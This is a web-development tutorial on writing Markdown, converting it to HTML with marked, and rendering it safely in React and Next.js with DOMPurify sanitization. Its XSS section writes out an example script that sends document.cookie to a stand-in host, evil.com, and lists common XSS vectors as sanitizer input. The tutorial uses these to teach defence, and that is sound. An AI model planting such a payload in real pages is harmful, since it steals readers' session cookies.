What Is Markdown?

Markdown is a lightweight markup language created by John Gruber in 2004. Its purpose is simple: let people write formatted text using plain characters that are easy to read even before they are converted to HTML. Instead of writing <h1>My Title</h1>, you write # My Title. Instead of <strong>bold</strong>, you write **bold**. The Markdown source is readable as-is, which makes it perfect for content that gets stored in databases, version-controlled in Git, or edited in simple text fields.

Markdown has become the universal language for developer content. GitHub uses it for README files and issues. Stack Overflow uses it for questions and answers. Most documentation sites, blog platforms, and content management systems support Markdown. If you learn it once, you can write content for hundreds of platforms.

Analogy: Markdown is like shorthand for HTML. Just as a court reporter uses shorthand symbols to write faster than longhand, Markdown uses simple characters like #, *, and - to represent HTML elements. The shorthand is faster to write and easier to read, but it converts to the same final product.

Markdown Syntax Reference

Here is a complete reference of the Markdown syntax you will use most often. On the left is what you type, and on the right is what it produces.

Headings

Headings use the # character. More hashes means a smaller heading, just like HTML's <h1> through <h6>.

# Heading 1        →  <h1>Heading 1</h1>
## Heading 2       →  <h2>Heading 2</h2>
### Heading 3      →  <h3>Heading 3</h3>
#### Heading 4     →  <h4>Heading 4</h4>
##### Heading 5    →  <h5>Heading 5</h5>
###### Heading 6   →  <h6>Heading 6</h6>

Text Emphasis

*italic text*          →  <em>italic text</em>
**bold text**          →  <strong>bold text</strong>
***bold and italic***  →  <strong><em>bold and italic</em></strong>
~~strikethrough~~      →  <del>strikethrough</del>

Links and Images

// Links: [visible text](URL)
[Visit Google](https://google.com)
→ <a href="https://google.com">Visit Google</a>

// Images: ![alt text](image URL)
![A cute cat](https://example.com/cat.jpg)
→ <img src="https://example.com/cat.jpg" alt="A cute cat">

The syntax for links and images is almost identical. Images just have an exclamation mark ! in front. The text in square brackets becomes the alt text for accessibility.

Lists

// Unordered list (use -, *, or +)
- First item
- Second item
  - Nested item
  - Another nested item
- Third item

// Ordered list
1. First step
2. Second step
3. Third step

Ordered lists are numbered, and Markdown will auto-number them even if you write 1. for every item. Nested items are created by indenting with two or four spaces.

Code

// Inline code uses single backticks
Use the `useState` hook for state management.

// Code blocks use triple backticks with an optional language
```javascript
function greet(name) {
  return `Hello, ${name}!`;
}
```

```css
.container {
  max-width: 800px;
  margin: 0 auto;
}
```

The language identifier after the opening triple backticks (like javascript or css) tells syntax highlighting tools which language to use. This is how developer documentation gets colorful code blocks.

Blockquotes

> This is a blockquote. It is used for callouts,
> quoted text, or important notes.
>
> It can span multiple paragraphs.

Tables

| Name     | Role        | Status   |
|----------|-------------|----------|
| Alice    | Developer   | Active   |
| Bob      | Designer    | Active   |
| Charlie  | Manager     | Away     |

The dashes --- separate the header row from the body. Column alignment can be controlled with colons: :--- for left, :---: for center, ---: for right.

Horizontal Rules

---
***
___

Three or more dashes, asterisks, or underscores create a horizontal line (<hr>), useful for separating sections.

Why Store Content as Markdown?

You might wonder: if the browser needs HTML, why not just store HTML in the database? There are several compelling reasons to store Markdown instead.

  • Simplicity for writers: Content authors do not need to know HTML. Markdown is simple enough to learn in 10 minutes. Blog posts, documentation, and product descriptions can be written by anyone on the team.
  • Smaller storage: # Hello World is much shorter than <h1 class="title">Hello World</h1>. Over thousands of blog posts, the storage difference adds up.
  • Portability: Markdown content works everywhere. If you switch from one blog platform to another, your Markdown files transfer directly. HTML often contains platform-specific classes and structures that do not port well.
  • Safety: Markdown is plain text. It does not contain executable scripts. When you store HTML in a database, you risk storing malicious <script> tags that could attack your users. Markdown eliminates this risk at the storage level.
  • Flexible rendering: The same Markdown content can be rendered differently for different contexts. Your website might add one set of CSS classes, your email system another, and your PDF generator yet another. The source content does not need to change.
CSK Connection The Computer Store KS blog stores all post content as Markdown in the blog_posts.content column in Supabase. When an admin writes a blog post in the admin editor, they write Markdown. When a customer visits /blog/[slug], the server fetches the Markdown string, converts it to HTML using the marked library, and renders it on the page. This means blog content is easy to write, safe to store, and beautiful to display.

The marked Library: Converting Markdown to HTML

marked is one of the most popular JavaScript libraries for converting Markdown text to HTML. It is fast, configurable, and supports the full CommonMark specification plus extensions like tables and task lists.

Installation

npm install marked

Basic Usage

import { marked } from 'marked';

const markdown = `
# Welcome to Our Blog

This is a **blog post** about building web applications.

## Key Topics

- React components
- TypeScript basics
- Database design

Here is some code:

\`\`\`javascript
const greeting = "Hello, World!";
console.log(greeting);
\`\`\`
`;

const html = marked.parse(markdown);
console.log(html);

The output of marked.parse() is a string of HTML:

<h1>Welcome to Our Blog</h1>
<p>This is a <strong>blog post</strong> about building web applications.</p>
<h2>Key Topics</h2>
<ul>
<li>React components</li>
<li>TypeScript basics</li>
<li>Database design</li>
</ul>
<p>Here is some code:</p>
<pre><code class="language-javascript">const greeting = "Hello, World!";
console.log(greeting);
</code></pre>

Configuration Options

import { marked } from 'marked';

// Configure marked globally
marked.setOptions({
  breaks: true,      // Convert \n to <br> (single newlines become line breaks)
  gfm: true,         // GitHub Flavored Markdown (tables, task lists, etc.)
});

// Or configure per-call
const html = marked.parse(markdown, {
  breaks: true,
  gfm: true,
});

The breaks: true option is important for user-generated content. By default, Markdown requires a blank line to create a new paragraph. With breaks: true, a single newline creates a <br>, which is what most users expect when they press Enter.

Rendering HTML in React: dangerouslySetInnerHTML

By default, React escapes all HTML in JSX to prevent security issues. If you write <p>{htmlString}</p>, React will display the literal HTML tags as text, not render them. To render a raw HTML string, you must use the dangerouslySetInnerHTML prop.

function BlogPost({ content }) {
  // Convert Markdown to HTML
  const html = marked.parse(content);

  return (
    <article
      className="prose"
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}

The prop's name is intentionally alarming: dangerouslySetInnerHTML. React's developers chose this name to make you stop and think before using it. The {{ __html: html }} syntax is also deliberately awkward. These are design decisions meant to communicate: "This bypasses React's built-in XSS protection. Are you sure?"

Why Is It Dangerous?

Cross-site scripting (XSS) is one of the most common web security vulnerabilities. It happens when an attacker injects malicious JavaScript into a page that other users view. If your blog allows Markdown content and someone writes:

# Innocent Blog Post

Here is some helpful content.

<script>
  // This script steals the user's session cookie
  // and sends it to the attacker's server
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

If you convert this Markdown to HTML with marked and render it with dangerouslySetInnerHTML without sanitization, the <script> tag will execute in every reader's browser. The attacker can steal session tokens, redirect users, or modify the page content.

Never Render Unsanitized User Content If the Markdown comes from user input (blog posts, comments, forum posts, ticket notes), you must sanitize the HTML before rendering it. The marked library converts Markdown to HTML but does not sanitize it. You need a separate sanitization step. Even if you trust your current users, sanitization protects against compromised accounts, copy-paste accidents, and future changes in who can submit content.

HTML Sanitization with DOMPurify

DOMPurify is the most widely used HTML sanitization library. It takes an HTML string and removes anything dangerous: <script> tags, event handlers like onclick, suspicious URLs, and other XSS vectors. Everything else passes through untouched.

Installation

npm install dompurify
npm install --save-dev @types/dompurify  # TypeScript types

Basic Usage

import DOMPurify from 'dompurify';
import { marked } from 'marked';

function renderMarkdown(markdownString) {
  // Step 1: Convert Markdown to HTML
  const rawHtml = marked.parse(markdownString);

  // Step 2: Sanitize the HTML (remove dangerous elements)
  const cleanHtml = DOMPurify.sanitize(rawHtml);

  return cleanHtml;
}

What DOMPurify Removes

const dirty = `
  <h1>Hello</h1>
  <p onclick="alert('hacked')">Click me</p>
  <script>alert('xss')</script>
  <img src="x" onerror="alert('xss')">
  <a href="javascript:alert('xss')">Click</a>
  <style>body { display: none; }</style>
`;

const clean = DOMPurify.sanitize(dirty);
console.log(clean);

// Output:
// <h1>Hello</h1>
// <p>Click me</p>
//
// <img src="x">
// <a>Click</a>
//

DOMPurify removed the <script> tag entirely, stripped the onclick and onerror event handlers, removed the javascript: URL from the link, and removed the <style> tag. The safe content (headings, paragraphs, images) passes through.

Configuration Options

// Allow only specific tags
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'ul', 'ol', 'li',
                 'strong', 'em', 'code', 'pre', 'blockquote',
                 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'class'],
});

// Allow target="_blank" on links
const clean = DOMPurify.sanitize(dirty, {
  ADD_ATTR: ['target'],
});

The Complete Safe Rendering Pattern

import DOMPurify from 'dompurify';
import { marked } from 'marked';

function BlogPostContent({ markdownContent }) {
  // Convert Markdown to HTML, then sanitize
  const html = DOMPurify.sanitize(
    marked.parse(markdownContent)
  );

  return (
    <article
      className="markdown-content"
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}

This three-step pipeline — Markdown in, HTML out, sanitize before render — is the standard pattern used across the industry. It gives you the simplicity of Markdown authoring with the safety of sanitized output.

Server-Side Rendering Note DOMPurify uses the browser's DOM API. In a Next.js application with server-side rendering, you need to use isomorphic-dompurify (a wrapper that works on both server and client) or only run DOMPurify on the client side. For server components, you can use the sanitize-html package as an alternative that works without a DOM.

Syntax Highlighting for Code Blocks

Markdown code blocks with a language identifier (like ```javascript) convert to <pre><code class="language-javascript"> in HTML. The language-javascript class tells a syntax highlighter which grammar to use for colorizing the code. Without a highlighter, code blocks are just monospace text. With one, they get the beautiful colored syntax you see on sites like GitHub.

Using highlight.js

npm install highlight.js
import hljs from 'highlight.js';
import 'highlight.js/styles/github-dark.css'; // Choose a theme
import { marked } from 'marked';

// Configure marked to use highlight.js
marked.setOptions({
  highlight: function(code, lang) {
    if (lang && hljs.getLanguage(lang)) {
      return hljs.highlight(code, { language: lang }).value;
    }
    // Fallback: auto-detect the language
    return hljs.highlightAuto(code).value;
  },
});

// Now marked.parse() produces pre-highlighted HTML
const html = marked.parse(markdownWithCode);

highlight.js comes with dozens of themes. Popular choices include github-dark, monokai, vs2015, and atom-one-dark. Import the CSS file for your chosen theme, and the code blocks will automatically be styled.

Alternative: Prism.js

Prism is another popular syntax highlighter. It works similarly but has a smaller core and a plugin architecture. Either library works well. The key concept is the same: you hook the highlighter into the markdown parser so code blocks get colorized during the Markdown-to-HTML conversion.

// With Prism (alternative approach - highlight after render)
import Prism from 'prismjs';
import 'prismjs/themes/prism-tomorrow.css';
import 'prismjs/components/prism-javascript';
import 'prismjs/components/prism-typescript';
import 'prismjs/components/prism-css';

// After rendering the HTML to the DOM:
useEffect(() => {
  Prism.highlightAll();
}, [content]);

Building a Blog Content Pipeline

Now that you understand each piece, let us assemble the complete pipeline: Markdown is authored, stored in the database, fetched by the application, converted to HTML, sanitized, and rendered with styling and syntax highlighting.

Author writes Stored in DB Fetched by app Converted Sanitized Rendered Markdown → blog_posts → API route → marked.parse() → DOMPurify → dangerouslySetInnerHTML (plain text) .content col GET /api/blog/[id] (raw HTML) (safe HTML) (styled output)

Server Component Implementation

// app/blog/[slug]/page.tsx
import { marked } from 'marked';
import DOMPurify from 'isomorphic-dompurify';
import { createClient } from '@/lib/supabase';

export default async function BlogPostPage({
  params
}: {
  params: { slug: string }
}) {
  const supabase = createClient();

  // Fetch the blog post by slug
  const { data: post, error } = await supabase
    .from('blog_posts')
    .select('*')
    .eq('slug', params.slug)
    .eq('status', 'published')
    .single();

  if (!post || error) {
    return <div>Post not found.</div>;
  }

  // Convert Markdown to sanitized HTML
  const contentHtml = DOMPurify.sanitize(
    marked.parse(post.content)
  );

  return (
    <article>
      <header>
        <h1>{post.title}</h1>
        <time>{new Date(post.published_at).toLocaleDateString()}</time>
        {post.category && <span>{post.category}</span>}
      </header>

      {post.featured_image && (
        <img
          src={post.featured_image}
          alt={post.title}
          style={{ maxWidth: '100%', borderRadius: '8px' }}
        />
      )}

      <div
        className="markdown-content"
        dangerouslySetInnerHTML={{ __html: contentHtml }}
      />
    </article>
  );
}

This is a Next.js server component. The Markdown conversion and sanitization happen on the server, so the client receives clean, ready-to-display HTML. No JavaScript parsing happens in the user's browser, which is faster and more secure.

Live Markdown Preview: Split Editor and Preview

For admin interfaces where users write Markdown, a live preview lets them see the rendered output as they type. The screen is split into two panels: a text editor on the left and a rendered preview on the right.

'use client';

import { useState, useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export default function MarkdownEditor({
  initialContent = '',
  onSave,
}) {
  const [markdown, setMarkdown] = useState(initialContent);

  // Memoize the HTML conversion so it only recalculates when markdown changes
  const previewHtml = useMemo(() => {
    return DOMPurify.sanitize(marked.parse(markdown));
  }, [markdown]);

  return (
    <div className="editor-container">
      {/* Editor Panel */}
      <div className="editor-panel">
        <div className="panel-header">
          <h3>Markdown</h3>
        </div>
        <textarea
          className="editor-textarea"
          value={markdown}
          onChange={(e) => setMarkdown(e.target.value)}
          placeholder="Write your content in Markdown..."
          spellCheck={true}
        />
      </div>

      {/* Preview Panel */}
      <div className="preview-panel">
        <div className="panel-header">
          <h3>Preview</h3>
        </div>
        <div
          className="markdown-content preview-content"
          dangerouslySetInnerHTML={{ __html: previewHtml }}
        />
      </div>
    </div>
  );
}

The useMemo hook is important here. Without it, the Markdown would be parsed on every render, even if it has not changed. With useMemo, the HTML is only recalculated when the markdown state actually changes. For short content, the difference is negligible. For long blog posts, it prevents unnecessary work.

Key Takeaways

  • Markdown is a lightweight syntax for writing formatted content that converts cleanly to HTML.
  • Store content as raw Markdown in the database, not HTML. Markdown is portable, safe, and flexible.
  • Use marked.parse() to convert Markdown strings to HTML strings on the server or client.
  • dangerouslySetInnerHTML renders raw HTML in React. The name is a warning: it bypasses XSS protection.
  • Always sanitize HTML from user-generated content with DOMPurify before rendering it. This prevents cross-site scripting attacks.
  • Style rendered Markdown with a scoped CSS class like .markdown-content that targets all standard HTML elements.
  • Syntax highlighting libraries like highlight.js or Prism colorize code blocks based on the language identifier.
